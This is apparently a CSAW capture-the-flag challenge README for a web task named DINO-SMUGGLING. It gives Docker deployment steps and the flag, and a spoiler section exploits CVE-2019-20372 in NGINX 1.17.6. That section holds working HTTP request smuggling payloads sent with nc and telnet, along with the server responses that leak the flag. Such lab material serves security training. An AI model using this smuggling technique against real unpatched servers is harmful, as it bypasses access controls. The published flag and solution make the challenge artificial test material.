# DINO-SMUGGLING

Category: Web

# Description

Smuggle HTTP request on vulnerable NGINX server to get a flag. 

# Deployment

        sudo docker build . -t dino
        sudo docker run -d -p 3009:3009 dino:latest

# Flag

csawctf{d0nt_smuggl3_Fla6s_!}

# Author
rollingcoconut

# Solution

<details>
    <summary> Spoiler warning </summary>


        https://www.rapid7.com/db/vulnerabilities/alpine-linux-cve-2019-20372/


        The docker container is running a vulnerable version of  NGINX -- 1.17.6
        Certain 302 redirections done in the error_page directive can allow for HTTP request smuggling.



        Here is the relevant code snippet from the vulnerable NGINX.conf:

        
            <i>(nginx.conf)</i>
            ...                                                                                                                                                                                                                                            
            location /flag {
                return 401;
            }

            error_page 401 http://localhost/flag.txt;
            ...
                                   


        To exploit the user can use telnet or nc where the vulnerable server is 192.168.56.6:3009

        # NC
            
        printf "GET /flag HTTP/1.1\r\nHost: 192.168.56.6:3009\r\nContent-Length: 172\r\n\r\nGET /flag.txt HTTP/1.1\r\nHost: localhost:3009\r\n\r\n" | nc 192.168.56.6 3009 -k
        HTTP/1.1 302 Moved Temporarily
        Server: nginx/1.17.6
        Date: Sat, 09 Sep 2023 15:10:30 GMT
        Content-Type: text/html
        Content-Length: 145
        Connection: keep-alive
        Location: http://localhost:3009/flag.txt
        
        <html>
        <head><title>302 Found</title></head>
        <body>
        <center><h1>302 Found</h1></center>
        <hr><center>nginx/1.17.6</center>
        </body>
        </html>
        HTTP/1.1 200 OK
        Server: nginx/1.17.6
        Date: Sat, 09 Sep 2023 15:10:30 GMT
        Content-Type: text/plain
        Content-Length: 29
        Connection: keep-alive
        
        csawctf{d0nt_smuggl3_Fla6s_!}
        
        
        # TELNET 
        
        telnet 192.168.56.6 3009
        Trying 192.168.56.6...
        Connected to 192.168.56.6.
        Escape character is '^]'.
        GET /flag HTTP/1.1
        Host: 192.168.56.6:3009
        Content-Length: 172
        
        GET /flag.txt HTTP/1.1
        Host: localhost:3009
        
        HTTP/1.1 302 Moved Temporarily
        Server: nginx/1.17.6
        Date: Sat, 09 Sep 2023 15:11:33 GMT
        Content-Type: text/html
        Content-Length: 145
        Connection: keep-alive
        Location: http://localhost:3009/flag.txt
        
        <html>
        <head><title>302 Found</title></head>
        <body>
        <center><h1>302 Found</h1></center>
        <hr><center>nginx/1.17.6</center>
        </body>
        </html>
        HTTP/1.1 200 OK
        Server: nginx/1.17.6
        Date: Sat, 09 Sep 2023 15:11:33 GMT
        Content-Type: text/plain
        Content-Length: 29
        Connection: keep-alive
        
        csawctf{d0nt_smuggl3_Fla6s_!}
        Connection closed by foreign host.
        

</details>
